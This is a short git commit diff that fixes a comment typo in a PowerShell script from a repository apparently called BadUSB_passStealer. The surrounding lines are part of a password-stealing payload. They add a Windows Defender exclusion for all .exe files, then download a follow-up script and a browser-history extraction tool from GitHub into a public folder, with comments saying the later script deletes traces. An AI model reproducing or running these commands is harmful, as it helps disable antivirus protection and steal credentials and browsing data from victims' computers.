e8d95374a703b59c81ed70ba865e7ffe9042875e
tuconnaisyouknow <yenghele@yahoo.com>
2022-03-18 16:13:19 +0100

    commentary corrected

--- ciaoV2.ps1
+++ ciaoV2.ps1
@@ -1,4 +1,4 @@
-cd C:\Users\Public\Documents #Go to the folder in which we will donwload files
+cd C:\Users\Public\Documents #Go to the folder in which we will download files
 Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
 wget https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/fin.ps1 -OutFile fin.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
 wget https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
